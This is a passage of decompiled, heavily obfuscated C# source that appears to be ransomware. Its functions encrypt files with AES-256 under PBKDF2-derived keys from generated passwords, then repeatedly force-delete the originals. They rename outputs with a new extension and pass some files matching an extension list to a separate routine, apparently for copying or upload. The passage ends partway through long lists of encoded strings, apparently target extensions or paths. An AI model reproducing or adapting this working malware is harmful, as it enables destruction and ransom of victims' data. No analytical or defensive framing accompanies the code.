										else if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().EndsWith(item2) && rLaVjFwRdfLdr == TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107396285))
										{
											try
											{
												FZYQuTJPlcz.FdLmtwIxPaLAh(TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368878), TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368905), TajjcMGKxy.UjdWIsKCvIWmr.getString_0(107368892), CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = ZCphZGDWjyA.BFOtjpRBWToz(32);
							string s = nLZNnVxqRyDU.rfAqHmOOmjC(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (RPSmcrMfZxWv == TajjcMGKxy.getString_0(107396275))
							{
								byte[] array = null;
								byte[] byte_ = GWOsLqMwIb.WvcDKTbtliDrPF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024);
								GWOsLqMwIb.isjSvDiECOPp(PwpxQaHWCtbm: (!geKzJTCQWBdPJrv) ? (jHNjZakAkEHPd ? GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (jHNjZakAkEHPd ? COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), PFFKOkRvQq: CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, lsppjlmhfssIIIt: bytes);
							}
							else if (!jHNjZakAkEHPd)
							{
								mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, VwOPUhcZlsvZmR, CS_0024_003C_003E8__locals0.UMxsSKxdLwMPg);
							}
							else
							{
								mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, VwOPUhcZlsvZmR, text, bytes);
							}
						}
						else
						{
							if (pWNBRDgBMEak)
							{
								CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO = ACFERZKTAMdtw + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO;
							}
							string text2 = ZCphZGDWjyA.BFOtjpRBWToz(32);
							string s2 = nLZNnVxqRyDU.rfAqHmOOmjC(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
							{
								if (!ZKpCkvvrIixyBkk)
								{
									if (!jHNjZakAkEHPd)
									{
										VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
									}
									else
									{
										VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!jHNjZakAkEHPd)
										{
											HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
										}
										else
										{
											HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (fKNptYRWsQNeZX)
										{
											try
											{
												File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365774) + ex6.Message + TajjcMGKxy.getString_0(107396671));
											}
											catch (Exception)
											{
											}
										}
										opDJfdSoJwBgd++;
										return;
									}
								}
							}
							else if (!ZKpCkvvrIixyBkk)
							{
								if (!jHNjZakAkEHPd)
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365815), IWnUVTiJnjexACCr);
								}
								else
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365815), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!jHNjZakAkEHPd)
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, IWnUVTiJnjexACCr);
									}
									else
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (fKNptYRWsQNeZX)
									{
										try
										{
											File.AppendAllText(TVaVFXxrZtbC, TajjcMGKxy.getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + TajjcMGKxy.getString_0(107365774) + ex8.Message + TajjcMGKxy.getString_0(107396671));
										}
										catch (Exception)
										{
										}
									}
									opDJfdSoJwBgd++;
									return;
								}
							}
							if (jHNjZakAkEHPd)
							{
								if (CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO != TajjcMGKxy.getString_0(107365820))
								{
									ZBrwuJMytAla(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + CS_0024_003C_003E8__locals0.MYWMPxbgtmbfTdO, bytes2);
								}
								else
								{
									ZBrwuJMytAla(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, bytes2);
								}
							}
						}
						end_IL_0681_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d81;
			IL_0d81:
			CS_0024_003C_003E8__locals0.sqQpQQcELGqIJWzCd.Remove(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
		});
	}

	private static void bYMHvDzMdQUn(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (UyFfCzWWLzNEG == getString_0(107396947))
					{
						foreach (string item in PlfqlzQrkBHY)
						{
							if (string_0.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396947))
							{
								if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396257))
							{
								try
								{
									FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107365797)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107365797), getString_0(107368289)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void HQqsRTFrfF(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (UyFfCzWWLzNEG == getString_0(107396947))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in PlfqlzQrkBHY)
			{
				if (string_0.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396947))
				{
					if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396257))
				{
					try
					{
						FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = COuKIqToBmSj.ECpnJyWrmVTmlfT(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		LHsTakbnvLMZqfZlb++;
	}

	private static void VLyxmOuvtqcVDJmc(string string_0, string string_1, byte[] byte_0)
	{
		aOOnOAEMeWLf CS_0024_003C_003E8__locals0 = new aOOnOAEMeWLf();
		CS_0024_003C_003E8__locals0.KxsEjRtwYB = string_0;
		CS_0024_003C_003E8__locals0.nvbZFFBLXADOA = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string nvbZFFBLXADOA = CS_0024_003C_003E8__locals0.nvbZFFBLXADOA;
			FileStream fileStream = new FileStream(nvbZFFBLXADOA, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (ObdFXRKnttrKo == getString_0(107396947))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.KxsEjRtwYB, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.KxsEjRtwYB, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.KxsEjRtwYB, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.nvbZFFBLXADOA.Length > 0)
				{
					if (UyFfCzWWLzNEG == getString_0(107396947))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.KxsEjRtwYB, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in PlfqlzQrkBHY)
						{
							if (CS_0024_003C_003E8__locals0.KxsEjRtwYB.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396947))
							{
								if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), CS_0024_003C_003E8__locals0.KxsEjRtwYB);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.KxsEjRtwYB.ToLower().EndsWith(item) && rLaVjFwRdfLdr == getString_0(107396257))
							{
								try
								{
									FZYQuTJPlcz.FdLmtwIxPaLAh(getString_0(107368850), getString_0(107368877), getString_0(107368864), CS_0024_003C_003E8__locals0.KxsEjRtwYB);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.KxsEjRtwYB);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.nvbZFFBLXADOA.EndsWith(getString_0(107365797)))
					{
						File.Move(CS_0024_003C_003E8__locals0.nvbZFFBLXADOA, CS_0024_003C_003E8__locals0.nvbZFFBLXADOA.Replace(getString_0(107365797), getString_0(107368289)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.nvbZFFBLXADOA))
							{
								File.Delete(CS_0024_003C_003E8__locals0.nvbZFFBLXADOA);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(TVaVFXxrZtbC, getString_0(107365500) + CS_0024_003C_003E8__locals0.KxsEjRtwYB + getString_0(107365756) + ex2.Message + getString_0(107396653));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = kaTfzyzEKr;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				AbIKggCUlEtU(getString_0(107365223), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source2 = xJpBolVCtSaaMGl;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (MINjWBEgMCN == getString_0(107396947))
		{
			string[] hrrdtvrqUAxN = HrrdtvrqUAxN;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), getString_0(107365189) + string_0 + getString_0(107365148));
				};
			}
			Parallel.ForEach(hrrdtvrqUAxN, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!EyIUaktyBiAWZ().Contains(getString_0(107365878)))
		{
			jcTlrrZTvkVzl(aJeonqeZxZjBYP);
		}
		else
		{
			List<string> source3 = qGtrUSLzRTTZGp;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					AbIKggCUlEtU(IOVuiCuRiaYQ(HoxnFARxQnHppaC(getString_0(107365143))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source4 = oaBCccgHDdJd;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365150)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source5 = icaOPjdPYWz;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				AbIKggCUlEtU(getString_0(107365133), string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		AbIKggCUlEtU(getString_0(107365223), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), getString_0(107365189) + string_0 + getString_0(107365148));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		AbIKggCUlEtU(IOVuiCuRiaYQ(HoxnFARxQnHppaC(getString_0(107365143))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365150)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		AbIKggCUlEtU(getString_0(107365133), string_0);
	}

	static ZNYsMUGPdZxeAunY()
	{
		Strings.CreateGetStringDelegate(typeof(ZNYsMUGPdZxeAunY));
		kFzbmJbQbZaZHkz = getString_0(107368433);
		IWnUVTiJnjexACCr = null;
		SGdiTvXzdcycb = getString_0(107396257);
		zCjFWNmzzORqwHz = getString_0(107365124);
		FoHxVrzKsk = new List<string>();
		HAdcZZonckXNrA = new List<string>();
		RwFshSEaCrYi = getString_0(107396257);
		UMxsSKxdLwMPg = getString_0(107368289);
		IdBmCgBFDzJuS = getString_0(107368289);
		rlCpcEJfqa = getString_0(107396257);
		dBCYPeUZqPCk = 0;
		REuQhDHRFMt = getString_0(107396947);
		zqQaaBwkjFY = getString_0(107396257);
		ayikziSNGVIUWoN = getString_0(107396257);
		ZIKygrMZbWsYlRS = getString_0(107365079);
		SmBjYePgOJlkai = getString_0(107396257);
		KkaQYWajqX = getString_0(107396257);
		XXjSrVedLdi = getString_0(107396257);
		giwadMcrrIYf = getString_0(107396257);
		riONhoDxUW = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107365074)),
			IOVuiCuRiaYQ(getString_0(107365089)),
			IOVuiCuRiaYQ(getString_0(107365064)),
			IOVuiCuRiaYQ(getString_0(107365015)),
			IOVuiCuRiaYQ(getString_0(107365022)),
			IOVuiCuRiaYQ(getString_0(107364997)),
			IOVuiCuRiaYQ(getString_0(107365460)),
			IOVuiCuRiaYQ(getString_0(107365435)),
			IOVuiCuRiaYQ(getString_0(107365442)),
			IOVuiCuRiaYQ(getString_0(107365417)),
			IOVuiCuRiaYQ(getString_0(107365368)),
			IOVuiCuRiaYQ(getString_0(107365375)),
			IOVuiCuRiaYQ(getString_0(107365350))
		};
		JGpmykxMfw = new List<string>();
		uXjfMSkaJzg = getString_0(107396257);
		KlxlmPvXLLFZ = getString_0(107396257);
		HvOLCEzZJtWnUd = getString_0(107396257);
		ojqyMmFKXxQzx = new List<string>();
		anjZHOfAxKdTwvsWK = getString_0(107396257);
		vAzGyuaypcRD = getString_0(107365325);
		wWAWZjvXYQSD = getString_0(107396947);
		lcjGAEybxEhtlc = getString_0(107396257);
		DTecMDyuar = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107365244)),
			IOVuiCuRiaYQ(getString_0(107364699)),
			IOVuiCuRiaYQ(getString_0(107364666)),
			IOVuiCuRiaYQ(getString_0(107364633)),
			IOVuiCuRiaYQ(getString_0(107364600)),
			IOVuiCuRiaYQ(getString_0(107364571)),
			IOVuiCuRiaYQ(getString_0(107364546)),
			IOVuiCuRiaYQ(getString_0(107364517)),
			IOVuiCuRiaYQ(getString_0(107364952)),
			IOVuiCuRiaYQ(getString_0(107364887)),
			IOVuiCuRiaYQ(getString_0(107364854)),
			IOVuiCuRiaYQ(getString_0(107364821)),
			IOVuiCuRiaYQ(getString_0(107364788)),
			IOVuiCuRiaYQ(getString_0(107364759)),
			IOVuiCuRiaYQ(getString_0(107364730)),
			IOVuiCuRiaYQ(getString_0(107462481)),
			IOVuiCuRiaYQ(getString_0(107462472)),
			IOVuiCuRiaYQ(getString_0(107462383)),
			IOVuiCuRiaYQ(getString_0(107462366)),
			IOVuiCuRiaYQ(getString_0(107462301)),
			IOVuiCuRiaYQ(getString_0(107462304)),
			IOVuiCuRiaYQ(getString_0(107462743)),
			IOVuiCuRiaYQ(getString_0(107462702)),
			IOVuiCuRiaYQ(getString_0(107462701)),
			IOVuiCuRiaYQ(getString_0(107462620)),
			IOVuiCuRiaYQ(getString_0(107462595)),
			IOVuiCuRiaYQ(getString_0(107462522)),
			IOVuiCuRiaYQ(getString_0(107461981)),
			IOVuiCuRiaYQ(getString_0(107461940)),
			IOVuiCuRiaYQ(getString_0(107461883)),
			IOVuiCuRiaYQ(getString_0(107461818)),
			IOVuiCuRiaYQ(getString_0(107461793)),
			IOVuiCuRiaYQ(getString_0(107462240)),
			IOVuiCuRiaYQ(getString_0(107462159)),
			IOVuiCuRiaYQ(getString_0(107462094)),
			IOVuiCuRiaYQ(getString_0(107462037)),
			IOVuiCuRiaYQ(getString_0(107462004)),
			IOVuiCuRiaYQ(getString_0(107461483)),
			IOVuiCuRiaYQ(getString_0(107461442)),
			IOVuiCuRiaYQ(getString_0(107461365)),
			IOVuiCuRiaYQ(getString_0(107461336)),
			IOVuiCuRiaYQ(getString_0(107461271)),
			IOVuiCuRiaYQ(getString_0(107461230)),
			IOVuiCuRiaYQ(getString_0(107461741)),
			IOVuiCuRiaYQ(getString_0(107461700)),
			IOVuiCuRiaYQ(getString_0(107461619)),
			IOVuiCuRiaYQ(getString_0(107461606)),
			IOVuiCuRiaYQ(getString_0(107461501)),
			IOVuiCuRiaYQ(getString_0(107460944)),
			IOVuiCuRiaYQ(getString_0(107460931)),
			IOVuiCuRiaYQ(getString_0(107460854)),
			IOVuiCuRiaYQ(getString_0(107460845)),
			IOVuiCuRiaYQ(getString_0(107460772)),
			IOVuiCuRiaYQ(getString_0(107460743)),
			IOVuiCuRiaYQ(getString_0(107461214)),
			IOVuiCuRiaYQ(getString_0(107461117)),
			IOVuiCuRiaYQ(getString_0(107461072)),
			IOVuiCuRiaYQ(getString_0(107461043)),
			IOVuiCuRiaYQ(getString_0(107461030)),
			IOVuiCuRiaYQ(getString_0(107460453)),
			IOVuiCuRiaYQ(getString_0(107460424)),
			IOVuiCuRiaYQ(getString_0(107460335)),
			IOVuiCuRiaYQ(getString_0(107460270)),
			IOVuiCuRiaYQ(getString_0(107460261)),
			IOVuiCuRiaYQ(getString_0(107460232)),
			IOVuiCuRiaYQ(getString_0(107460703)),
			IOVuiCuRiaYQ(getString_0(107460590)),
			IOVuiCuRiaYQ(getString_0(107460529)),
			IOVuiCuRiaYQ(getString_0(107460488)),
			IOVuiCuRiaYQ(getString_0(107459899)),
			IOVuiCuRiaYQ(getString_0(107459866)),
			IOVuiCuRiaYQ(getString_0(107459825)),
			IOVuiCuRiaYQ(getString_0(107459780)),
			IOVuiCuRiaYQ(getString_0(107459703)),
			IOVuiCuRiaYQ(getString_0(107460158)),
			IOVuiCuRiaYQ(getString_0(107460109)),
			IOVuiCuRiaYQ(getString_0(107460048)),
			IOVuiCuRiaYQ(getString_0(107460039)),
			IOVuiCuRiaYQ(getString_0(107459974)),
			IOVuiCuRiaYQ(getString_0(107459381)),
			IOVuiCuRiaYQ(getString_0(107459324)),
			IOVuiCuRiaYQ(getString_0(107459291)),
			IOVuiCuRiaYQ(getString_0(107459262)),
			IOVuiCuRiaYQ(getString_0(107459205)),
			IOVuiCuRiaYQ(getString_0(107462037)),
			IOVuiCuRiaYQ(getString_0(107459660)),
			IOVuiCuRiaYQ(getString_0(107459619)),
			IOVuiCuRiaYQ(getString_0(107459530)),
			IOVuiCuRiaYQ(getString_0(107459453)),
			IOVuiCuRiaYQ(getString_0(107458912)),
			IOVuiCuRiaYQ(getString_0(107458887)),
			IOVuiCuRiaYQ(getString_0(107458810)),
			IOVuiCuRiaYQ(getString_0(107458793)),
			IOVuiCuRiaYQ(getString_0(107461883)),
			IOVuiCuRiaYQ(getString_0(107458728)),
			IOVuiCuRiaYQ(getString_0(107458687)),
			IOVuiCuRiaYQ(getString_0(107459142)),
			IOVuiCuRiaYQ(getString_0(107461818)),
			IOVuiCuRiaYQ(getString_0(107459037)),
			IOVuiCuRiaYQ(getString_0(107459020)),
			IOVuiCuRiaYQ(getString_0(107458387)),
			IOVuiCuRiaYQ(getString_0(107458322)),
			IOVuiCuRiaYQ(getString_0(107458305)),
			IOVuiCuRiaYQ(getString_0(107462240)),
			IOVuiCuRiaYQ(getString_0(107458196)),
			IOVuiCuRiaYQ(getString_0(107462004)),
			IOVuiCuRiaYQ(getString_0(107462159)),
			IOVuiCuRiaYQ(getString_0(107458163)),
			IOVuiCuRiaYQ(getString_0(107458618)),
			IOVuiCuRiaYQ(getString_0(107462094)),
			IOVuiCuRiaYQ(getString_0(107458585)),
			IOVuiCuRiaYQ(getString_0(107458568)),
			IOVuiCuRiaYQ(getString_0(107458487)),
			IOVuiCuRiaYQ(getString_0(107461940)),
			IOVuiCuRiaYQ(getString_0(107458494)),
			IOVuiCuRiaYQ(getString_0(107458417)),
			IOVuiCuRiaYQ(getString_0(107457876)),
			IOVuiCuRiaYQ(getString_0(107457847)),
			IOVuiCuRiaYQ(getString_0(107457834)),
			IOVuiCuRiaYQ(getString_0(107457801)),
			IOVuiCuRiaYQ(getString_0(107457744)),
			IOVuiCuRiaYQ(getString_0(107457731)),
			IOVuiCuRiaYQ(getString_0(107457706)),
			IOVuiCuRiaYQ(getString_0(107457665)),
			IOVuiCuRiaYQ(getString_0(107458100)),
			IOVuiCuRiaYQ(getString_0(107458083)),
			IOVuiCuRiaYQ(getString_0(107458026)),
			IOVuiCuRiaYQ(getString_0(107457993)),
			IOVuiCuRiaYQ(getString_0(107457916)),
			IOVuiCuRiaYQ(getString_0(107457371)),
			IOVuiCuRiaYQ(getString_0(107457330)),
			IOVuiCuRiaYQ(getString_0(107461981)),
			IOVuiCuRiaYQ(getString_0(107458083)),
			IOVuiCuRiaYQ(getString_0(107457321)),
			IOVuiCuRiaYQ(getString_0(107457292)),
			IOVuiCuRiaYQ(getString_0(107457231)),
			IOVuiCuRiaYQ(getString_0(107457214)),
			IOVuiCuRiaYQ(getString_0(107457141)),
			IOVuiCuRiaYQ(getString_0(107457592)),
			IOVuiCuRiaYQ(getString_0(107457519)),
			IOVuiCuRiaYQ(getString_0(107457490)),
			IOVuiCuRiaYQ(getString_0(107457457)),
			IOVuiCuRiaYQ(getString_0(107457416)),
			IOVuiCuRiaYQ(getString_0(107456875)),
			IOVuiCuRiaYQ(getString_0(107456830)),
			IOVuiCuRiaYQ(getString_0(107456733)),
			IOVuiCuRiaYQ(getString_0(107456700)),
			IOVuiCuRiaYQ(getString_0(107456655)),
			IOVuiCuRiaYQ(getString_0(107457106)),
			IOVuiCuRiaYQ(getString_0(107457073)),
			IOVuiCuRiaYQ(getString_0(107457060)),
			IOVuiCuRiaYQ(getString_0(107456995)),
			IOVuiCuRiaYQ(getString_0(107456962)),
			IOVuiCuRiaYQ(getString_0(107456889)),
			IOVuiCuRiaYQ(getString_0(107456360)),
			IOVuiCuRiaYQ(getString_0(107462620)),
			IOVuiCuRiaYQ(getString_0(107456331)),
